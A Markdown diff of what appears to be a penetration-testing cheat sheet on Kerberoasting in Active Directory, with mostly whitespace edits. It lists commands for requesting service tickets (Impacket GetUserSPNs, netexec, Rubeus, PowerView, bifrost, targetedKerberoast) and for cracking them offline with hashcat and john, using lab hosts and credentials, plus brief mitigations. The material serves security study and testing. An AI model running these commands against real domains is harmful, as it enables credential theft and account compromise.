@@ -4,8 +4,8 @@
 
 Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
 
-
 * [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite
+
   ```powershell
   $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 
@@ -19,6 +19,7 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
   ```
 
 * netexec Module
+
   ```powershell
   $ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
   LDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False)
@@ -26,6 +27,7 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
   ```
 
 * [Rubeus](https://github.com/GhostPack/Rubeus)
+
   ```powershell
   # Stats
   Rubeus.exe kerberoast /stats
@@ -48,25 +50,27 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
   ```
 
 * [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+
   ```powershell
   Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
   ```
 
 * [bifrost](https://github.com/its-a-feature/bifrost) on **macOS** machine
+
   ```powershell
   ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
   ```
 
 * [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
+
   ```powershell
   # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), 
   # print the "kerberoast" hash, and delete the temporary SPN set for that operation
   targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
-  ``` 
+  ```
 
+Then crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`)
 
-Then crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`) 
-	
 | Mode    | Description  |
 |---------|--------------|
 | `13100` | Kerberos 5 TGS-REP etype 23 (RC4) |
@@ -78,12 +82,10 @@ Then crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`)
 ./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
 ```
 
-
-**Mitigations**: 
+**Mitigations**:
 
 * Have a very long password for your accounts with SPNs (> 32 characters)
 * Make sure no users have SPNs
-
 
 ## References
 
